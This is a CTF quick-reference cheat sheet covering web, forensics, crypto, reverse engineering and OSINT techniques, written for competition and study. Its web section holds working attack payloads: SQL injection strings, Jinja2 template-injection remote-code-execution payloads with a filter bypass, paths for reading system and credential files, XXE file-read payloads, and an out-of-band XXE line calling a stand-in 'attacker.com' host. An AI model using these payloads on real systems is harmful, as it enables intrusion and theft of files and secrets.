# CTF Quick Reference

## Web

### Recon checklist
```
[ ] robots.txt, sitemap.xml
[ ] .git/ exposure → git-dumper
[ ] /.env, /backup, /admin, /config
[ ] Source code comments
[ ] HTTP response headers (Server, X-Powered-By, Set-Cookie)
[ ] Cookie values → base64/JWT/flask session?
[ ] Parameter fuzzing → ffuf/wfuzz
[ ] Subdomains → subfinder, amass
```

### SQLi quick test
```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### SSTI detection (by framework)
```
{{7*7}}          → Jinja2/Twig (49)
${7*7}           → FreeMarker/Thymeleaf
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
{{7*'7'}}        → Twig returns 49, Jinja2 returns 7777777
```

### Jinja2 SSTI RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Filter bypass (no dots)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### LFI wordlist paths
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log    # log poisoning
/var/log/auth.log
../../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
```

### JWT attacks
```bash
# None algorithm
# Change alg to "none", remove signature

# HS256 with weak secret
hashcat -a 0 -m 16500 <jwt> rockyou.txt

# RS256 → HS256 confusion (use public key as HMAC secret)
```

### XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- OOB exfil -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

---

## Forensics

### File identification
```bash
file suspicious
xxd suspicious | head        # hex header
binwalk suspicious            # embedded files
strings suspicious | less
exiftool suspicious
```

### Common magic bytes
| Format | Hex |
|--------|-----|
| PNG | `89 50 4E 47` |
| JPEG | `FF D8 FF` |
| PDF | `25 50 44 46` |
| ZIP | `50 4B 03 04` |
| ELF | `7F 45 4C 46` |
| PE (EXE) | `4D 5A` (MZ) |
| GZIP | `1F 8B` |

### Steganography order of operations
```
1. file + exiftool           # metadata
2. strings | grep flag
3. binwalk -e               # extract embedded
4. steghide extract -sf img  # LSB with passphrase
5. zsteg img.png             # LSB (PNG/BMP)
6. stegsolve                 # visual bit plane analysis
7. foremost / photorec       # file carving
```

### Memory forensics first pass
```bash
vol -f dump.mem windows.info
vol -f dump.mem windows.pstree
vol -f dump.mem windows.cmdline
vol -f dump.mem windows.netscan
vol -f dump.mem windows.malfind
```

---

## Crypto

### Identify cipher type
```
Base64: [A-Za-z0-9+/=]
Base32: [A-Z2-7=]
Hex:    [0-9a-fA-F] (even length)
ROT13:  letter frequency same as English
Vigenere: letter frequency present
XOR:    often high non-printable byte ratio
```

### CyberChef magic operations
```
Magic (auto detect)
From Base64 → decode
XOR Brute Force
ROT13 / ROT47
Frequency Analysis
```

### RSA CTF attacks
```
e=3 + small m     → cube root attack
same n, diff e    → common modulus
n factorable      → factordb.com
p≈q               → Fermat factorization
d small           → Wiener attack
```

---

## Reverse Engineering

### Initial analysis
```bash
file binary
strings binary | less
ltrace ./binary              # library calls
strace ./binary              # syscalls
objdump -d binary | less     # disassembly
readelf -a binary            # ELF headers
```

### GDB quick
```
b main          # breakpoint
r               # run
ni              # next instruction
si              # step into
info reg        # registers
x/20x $esp      # hex dump stack
x/s 0xaddr      # string at address
```

### Common CTF binary patterns
```
strcmp(input, flag)     → check in ltrace, or patch jump
strncmp with length     → input exactly N chars
Custom encoding loop    → reverse in Python
Stack canary bypass     → find canary via leak, overwrite correctly
```

---

## OSINT

### Username enumeration
```
sherlock <username>
whatsmyname.app
namechk.com
```

### Image OSINT
```
Google Lens / TinEye        # reverse image
exiftool img.jpg            # GPS coords, device info
Metadata2Go.com
```

### Domain / IP recon
```bash
whois domain.com
dig domain.com ANY
theHarvester -d domain.com -b all
shodan search hostname:domain.com
```

---

## Useful online tools
| Tool | URL | Use |
|------|-----|-----|
| CyberChef | gchq.github.io/CyberChef | Encoding/decoding/everything |
| VirusTotal | virustotal.com | Hash/URL/file lookup |
| CrackStation | crackstation.net | Hash lookup |
| factordb | factordb.com | RSA n factoring |
| dcode.fr | dcode.fr | Cipher identification |
| geoip | iplocation.net | IP geolocation |
| Shodan | shodan.io | Internet-exposed host search |
| MITRE ATT&CK | attack.mitre.org | TTP reference |
